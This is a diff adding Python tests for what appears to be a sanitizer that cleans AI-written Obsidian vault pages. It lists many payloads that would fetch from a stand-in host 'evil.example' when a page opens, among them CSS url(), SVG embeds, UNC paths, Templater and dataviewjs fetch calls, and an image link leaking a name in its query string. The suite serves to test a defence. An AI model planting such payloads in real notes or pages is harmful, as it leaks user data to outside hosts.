@@ -410,6 +410,115 @@ def t_safe_links():
               p.changes and p.changes[0].text)
 
 
+def t_body_allowlist_refuses_every_way_to_fetch():
+    """K1: the old denylist let each of these through. Each would make
+    Obsidian load something from outside the vault the moment the page opens."""
+    refusing = [
+        ("CSS url() in style=", '<span style="background:url(https://evil.example/q.png)">x</span>'),
+        ("style= alone", '<div style="color:red">x</div>'),
+        ("SVG <image>", '<svg><image href="https://evil.example/s.png"/></svg>'),
+        ("SVG <use>", '<svg><use xlink:href="https://evil.example/s.svg#a"/></svg>'),
+        ("<table background>", '<table background="https://evil.example/t.png"><tr><td>x</td></tr></table>'),
+        ("<td background>", '<table><tr><td background="//evil.example/t.png">x</td></tr></table>'),
+        ("<input type=image>", '<input type="image" src="https://evil.example/i.png">'),
+        ("<picture>", '<picture><source srcset="https://evil.example/p.png"></picture>'),
+        ("<object>", '<object data="https://evil.example/o"></object>'),
+        ("<a href>", '<a href="https://evil.example">x</a>'),
+        ("<link>", '<link rel="stylesheet" href="https://evil.example/s.css">'),
+        ("an upper-case tag", '<IMG SRC="https://evil.example/u.png">'),
+        ("a tag split over lines", '<img\nsrc="https://evil.example/n.png">'),
+        ("an unknown tag", '<x-thing>x</x-thing>'),
+        ("a tag Jarvis cannot parse", 'a <img src="https://evil.example/q.png" onerror=x'),
+        ("<!DOCTYPE / CDATA", '<![CDATA[x]]>'),
+        ("<? processing", '<?xml-stylesheet href="https://evil.example/x.css"?>'),
+        ("Templater <% %>", '<% tp.web.random_picture() %>'),
+        ("Templater <%* %>", '<%* await fetch("https://evil.example") %>'),
+        ("a remote reference definition", '![a][x]\n\n[x]: https://evil.example/r.png'),
+        ("a protocol-relative reference definition", '![a][x]\n\n[x]: //evil.example/r.png'),
+        ("a file: reference definition", '![a][x]\n\n[x]: file:///C:/Users/owner/secret.png'),
+        ("a reference definition in a list", '- [x]: <https://evil.example/r.png>'),
+        ("an entity-hidden reference definition", '[x]: https&#58;//evil.example/r.png'),
+        ("a UNC reference definition", '[x]: \\\\evil.example\\share\\r.png'),
+        ("a dataviewjs block", '```dataviewjs\nfetch("https://evil.example")\n```'),
+        ("a dataviewjs block in a list", '- ```dataviewjs\nx\n```'),
+        ("a tilde-fenced dataview block", '~~~dataview\nLIST\n~~~'),
+        ("an inline Dataview JS span", 'see `$= dv.el("img", "")`'),
+        ("an inline Dataview span", 'see `= this.file.name`'),
+        ("class= holding an address", '<span class="https://evil.example">x</span>'),
+        ("title= holding url(", '<span title="url(https://evil.example/t.png)">x</span>'),
+    ]
+    for name, body in refusing:
+        out, why = W.make_safe(body)
+        check(f"refused: {name}", out == "" and bool(why), repr((out, why)))
+
+    rewritten = [
+        ("an https picture", "![c](https://evil.example/c.png)", "[c](https://evil.example/c.png)"),
+        ("a file: picture", "![c](file:///C:/x.png)", "[c](file:///C:/x.png)"),
+        ("a drive-letter picture", "![c](C:/Users/owner/x.png)", "[c](C:/Users/owner/x.png)"),
+        ("a protocol-relative picture", "![c](//evil.example/c.png)", "[c](//evil.example/c.png)"),
+        ("a picture in <>", "![c](<https://evil.example/c d.png>)", "[c](<https://evil.example/c d.png>)"),
+        ("a picture after a space", "![c]( https://evil.example/c.png)", "[c]( https://evil.example/c.png)"),
+        ("a percent-encoded scheme", "![c](https%3A//evil.example/c.png)", "[c](https%3A//evil.example/c.png)"),
+        ("an entity-encoded scheme", "![c](https&#58;//evil.example/c.png)", "[c](https&#58;//evil.example/c.png)"),
+        ("a UNC path", "![c](\\\\evil.example\\share\\c.png)", "[c](\\\\evil.example\\share\\c.png)"),
+        ("a doubled bang", "!![c](https://evil.example/c.png)", "[c](https://evil.example/c.png)"),
+        ("a reference-style picture", "![a][x]", "[a][x]"),
+        ("a reference-style picture, even of a vault file",
+         "![a][x]\n\n[x]: attachments/a.png", "[a][x]\n\n[x]: attachments/a.png"),
+        ("a shortcut reference picture", "![x]", "[x]"),
+        ("a picture with brackets in its text", "![a [b]](https://evil.example/c.png)",
+         "[a [b]](https://evil.example/c.png)"),
+        ("an https wiki embed", "![[https://evil.example/x.png]]", "<https://evil.example/x.png>"),
+        ("a file: wiki embed", "![[file:///C:/x.png]]", "<file:///C:/x.png>"),
+        ("a file: wiki embed with spaces", "![[file:///C:/my x.png]]", "[[file:///C:/my x.png]]"),
+        ("a UNC wiki embed", "![[\\\\evil\\share\\x.png]]", "[[\\\\evil\\share\\x.png]]"),
+    ]
+    for name, body, want in rewritten:
+        out, why = W.make_safe(body)
+        check(f"made a plain link: {name}", out == want and why == "" and "![" not in out,
+              repr((out, why)))
+
+    kept = [
+        ("a vault picture", "![map](attachments/plot map.png)"),
+        ("a vault picture in <>", "![map](<attachments/plot map.png>)"),
+        ("a wiki embed of a vault note", "![[Margaret Hale#Chair]]"),
+        ("a wiki embed of a vault picture", "![[plot.png|200]]"),
+        ("plain links", "[site](https://ok.example) and <https://ok.example> and [[B]]"),
+        ("simple formatting HTML", '<details open><summary>More</summary><b>bold</b> '
+                                   '<span class="x" title="t">s</span><br/><sub>2</sub></details>'),
+        ("a table", '<table><tr><td colspan="2" align="left">x</td></tr></table>'),
+        ("an HTML comment", "<!-- a note to self -->"),
+        ("a local reference definition", "[a][x]\n\n[x]: attachments/a.png"),
+        ("a python block", "```python\nprint(1)\n```"),
+        ("a bare block", "```\nplain\n```"),
+        ("a less-than in prose", "x < y and 3 <4 and a<=b"),
+        ("a code span", "run `ls -la` here"),
+    ]
+    for name, body in kept:
+        out, why = W.make_safe(body)
+        check(f"kept as written: {name}", out == body and why == "", repr((out, why)))
+
+
+def t_summary_is_plain_text_in_index_and_card():
+    """K1: the one-line summary went into index.md unfiltered."""
+    evil = ('Sam ![x](https://evil.example/p.png?leak=Sam) <img src="https://evil.example/i"> '
+            '![[https://evil.example/w.png]] `$= dv.x` [[Sam]]')
+    with Vault() as v:
+        p = _plan(Model(pages(("create", "Pages/Sam.md", evil, "Sam is a friend."))))
+        s = p.changes[0].summary if p.changes else ""
+        check("the summary keeps its words and loses its markup",
+              s == 'Sam !x(https://evil.example/p.png?leak=Sam) img src="https://evil.example/i" '
+                   '!https://evil.example/w.png $= dv.x Sam', repr(s))
+        card = W.describe(p)
+        check("the card shows the summary exactly as it will be written",
+              f"new page     Pages/Sam.md - {s}" in card, card)
+        out = W.run(p, approved=True)
+        idx = (v.wiki / W.INDEX_NAME).read_text(encoding="utf-8")
+        check("index.md gets the plain summary: no picture, tag, embed or code span",
+              out["ok"] and f"- [[Sam]] - {s}\n" in idx
+              and not re.search(r"!\[|<img|`", idx), idx)
+
+
 def t_describe():
     with Vault():
         p = _plan()
